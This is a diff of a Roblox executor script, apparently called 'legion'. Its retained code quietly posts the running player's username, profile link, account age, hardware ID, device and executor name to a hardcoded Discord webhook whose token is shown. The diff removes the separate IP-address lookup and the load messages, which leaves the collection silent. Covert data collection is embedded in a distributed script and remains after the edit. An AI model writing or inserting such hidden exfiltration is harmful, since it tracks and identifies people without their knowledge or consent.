@@ -5185,8 +5185,7 @@ chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Positio
 
 local webhookUrl = "https://discord.com/api/webhooks/1288255480002773003/xZjYoUzH4qm9lUq1hyOsQIVUfs3framLoJd7gnxoz6LzatnWu5hxN-IR27NILrcBR6nW"
 
-
-local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName, ipAddress)
+local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName)
     
     local data = {
         ["embeds"] = {
@@ -5238,11 +5237,6 @@ local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink,
                         ["name"] = "Executor",
                         ["value"] = executorName,
                         ["inline"] = false
-                    },
-                    {
-                        ["name"] = "IP Address",
-                        ["value"] = "||" .. ipAddress .. "||",  
-                        ["inline"] = false
                     }
                 },
                 ["color"] = 16753920 
@@ -5250,10 +5244,8 @@ local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink,
         }
     }
 
-    
     local jsonData = game:GetService("HttpService"):JSONEncode(data)
 
-    
     local response = http_request({
         Url = webhookUrl,
         Method = "POST",
@@ -5262,15 +5254,7 @@ local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink,
         },
         Body = jsonData
     })
-
-    
-    if response.StatusCode == 204 then
-        print("loaded legion")
-    else
-        print("Failed to load legion code: " .. response.StatusCode)
-    end
 end
-
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer 
@@ -5281,45 +5265,14 @@ local gameId = game.PlaceId
 local userLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
 local accountAge = player.AccountAge .. " days"
 
-
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
-
 
 local deviceType = identifyexecutor() and (identifyexecutor():find("Mobile") and "Mobile 📱" or "PC 💻") or "Unknown"
 
-
 local executorName = identifyexecutor() or "Unknown"
 
+sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName)
 
-local function getIPAddress()
-    local ipResponse = http_request({
-        Url = "http://ip-api.com/json/",
-        Method = "GET",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        }
-    })
-
-    if ipResponse.StatusCode == 200 then
-        local success, ipData = pcall(function()
-            return game:GetService("HttpService"):JSONDecode(ipResponse.Body)
-        end)
-
-        if success and ipData and ipData.query then
-            return ipData.query  
-        else
-            return "Unknown IP"
-        end
-    else
-        return "Unknown IP"
-    end
-end
-
-
-local ipAddress = getIPAddress()
-
-
-sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName, ipAddress)
 
 
 
